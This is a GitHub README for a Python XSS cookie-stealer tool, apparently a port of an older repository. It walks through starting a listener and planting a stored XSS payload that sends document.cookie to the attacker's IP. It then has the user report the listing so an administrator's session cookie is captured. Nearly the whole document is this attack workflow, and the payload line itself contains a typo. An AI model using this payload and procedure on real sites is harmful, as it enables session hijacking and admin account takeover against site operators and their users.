# XSS-cookie-stealer.py
I recreated it with Python 3 because it is a very old repository. The original author of this is @R0B1NL1N at github.com.



This is my circumstance, and I have the option of reporting to the admins button!, but there are a lot of other uses as well.

# How to use
1- Change IP address in the script.

![image](https://user-images.githubusercontent.com/102862377/203699668-456c24c0-4f15-4f12-a6c5-166f6089fa44.png)


2- Run the script.

`python3 XSS-cookie-stealer.py`

![image](https://user-images.githubusercontent.com/102862377/203699097-d805bf19-0ced-43f7-a9e6-f2dda7cfa813.png)

3- Create a new listing and enter the exploit script.

`<script>var i=new Image;i.src="http://(Your IP):8888/?"+document.cookie;</scirpt>`

![image](https://user-images.githubusercontent.com/102862377/203699802-2ec5643e-2717-4cd2-ab53-40b8dbf2c8af.png)

4- As soon as we submit, we should see our cookie appear on the http server running on our attack machine:

![image](https://user-images.githubusercontent.com/102862377/203699868-ab19e552-34e9-4aeb-9754-f34ad2b04ccb.png)

5- Let’s now click on the link and report listing to the admins:

![image](https://user-images.githubusercontent.com/102862377/203699911-513801f2-ebae-43fa-8127-80d6a6c56314.png)

6- Click ‘Report’ button and we should see the admin cookie appear on our http server:

![image](https://user-images.githubusercontent.com/102862377/203699989-a56ea191-92a7-4149-9781-6b286573e2a0.png)


